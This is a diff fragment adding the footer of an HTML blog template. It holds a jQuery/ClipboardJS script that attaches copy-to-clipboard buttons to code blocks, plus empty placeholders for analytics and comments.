+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
